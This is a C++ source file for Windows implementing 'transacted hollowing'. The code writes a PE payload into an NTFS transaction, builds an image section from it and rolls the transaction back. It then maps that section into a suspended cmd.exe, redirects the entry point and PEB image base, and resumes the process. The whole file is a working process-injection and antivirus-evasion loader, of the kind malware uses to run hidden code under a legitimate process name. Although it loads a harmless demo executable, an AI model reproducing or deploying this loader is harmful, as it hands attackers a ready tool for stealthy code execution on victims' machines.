#include "common.h"

BOOL TransactHollowing(PBYTE payload, SIZE_T payloadSize){
    OBJECT_ATTRIBUTES objAttr = {0};
    HANDLE hTransaction = NULL;
    NTSTATUS status = 0;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    status = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
    if (!NT_SUCCESS(status)){
        return FALSE;
    }
    std::cout << "[+] NtCreateTransaction success" << std::endl;

    LPCWSTR lpFileName = L"c:\\windows\\temp\\test.txt";
    HANDLE hFileTransacted = CreateFileTransactedW(
        lpFileName, 
        GENERIC_READ | GENERIC_WRITE, 0, NULL,
	    OPEN_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL,
        NULL, 
        hTransaction, 
        NULL,
        NULL);
    if (hFileTransacted == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    std::cout << "[+] CreateFileTransactedW success" << std::endl;

    // Write payload to transacted file
    WriteFile(hFileTransacted, payload, (DWORD)payloadSize, NULL, NULL);

    HANDLE hSection = NULL;
    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFileTransacted);
    if (!NT_SUCCESS(status)){
        return FALSE;
    }
    std::cout << "[+] NtCreateSection success" << std::endl;

    status = NtRollbackTransaction(hTransaction, TRUE);
    if (!NT_SUCCESS(status)){
        return FALSE;
    }
    std::cout << "[+] NtRollbackTransaction success" << std::endl;

    NtClose(hTransaction);
    hTransaction = NULL;
    // NtClose(hFileTransacted);
    // hFileTransacted = INVALID_HANDLE_VALUE;

    HANDLE hProcess = NULL;
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi;
    WCHAR commandLine[MAX_PATH] = {0};
    lstrcpyW(commandLine, L"cmd.exe");
    if (!CreateProcessW(
        NULL, 
        commandLine, 
        NULL, 
        NULL, 
        TRUE, 
        CREATE_SUSPENDED, 
        NULL, 
        NULL, 
        &si, 
        &pi))
    {
        return FALSE;
    }
    hProcess = pi.hProcess;
    std::cout << "[+] Create suspended process success" << std::endl;
    
    PVOID sectionBaseAddress = NULL;
    SIZE_T viewSize = 0;
    status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    std::cout << "[+] Mapped Section To The Target Process success" << std::endl;
    std::cout << "[+] Mapped section base address" << sectionBaseAddress << std::endl;

	PROCESS_BASIC_INFORMATION pbi;
    ULONG retLength = 0;
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &retLength);
    if (!NT_SUCCESS(status)){
        return FALSE;
    }
    std::cout << "[+] NtQueryInformationProcess success" << std::endl;
    std::cout << "[+] image base: " << pbi.PebBaseAddress << std::endl;

    PEB_ peb = {0};
	if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)){
        return FALSE;
    }
    std::cout << "[+] NtReadVirtualMemory success" << std::endl;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)dosHeader + dosHeader->e_lfanew);
    LPVOID entryPoint = (LPVOID)((ULONG_PTR)sectionBaseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[+] entry point: " << entryPoint << std::endl;

    CONTEXT ctx  = {0};
    ctx.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pi.hThread, &ctx)) {
		return FALSE;
	}
    std::cout << "[+] Get process thread context success" << std::endl;

#ifdef _M_X64
    ctx.Rcx = (ULONG_PTR)entryPoint;
#else
    ctx.Eax = (ULONG_PTR)entryPoint;
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
		return FALSE;
	}
    std::cout << "[+] Set process thread context success" << std::endl;

    //DebugBreak();
    // LPVOID remotePEB;
    // remotePEB = (PEB_*)pbi.PebBaseAddress;
    LPVOID remoteImageBase = (LPVOID)((ULONG_PTR)pbi.PebBaseAddress + sizeof(LPVOID) * 2);
    std::cout << "[+] Remote process image base: " << remoteImageBase << std::endl;

    if (!WriteProcessMemory(hProcess, remoteImageBase, &sectionBaseAddress, sizeof(LPVOID), NULL)){
        return FALSE;
    }
    std::cout << "[+] Update remote process image base success" << std::endl;

    ResumeThread(pi.hThread);
    std::cout << "[+] Remote process thread resume" << std::endl;
    //getchar();
    
    return TRUE;
}

int main(int, char**) {

#ifdef _M_X64
    CHAR path[] = {"hello_x64.exe"};
#else
    CHAR path[] = {"hello_x86.exe"};
#endif

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    PBYTE pBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
    ReadFile(hFile, pBuff, dwFileSize, NULL, NULL);
    CloseHandle(hFile);
    TransactHollowing(pBuff, dwFileSize);

    return 0;
}
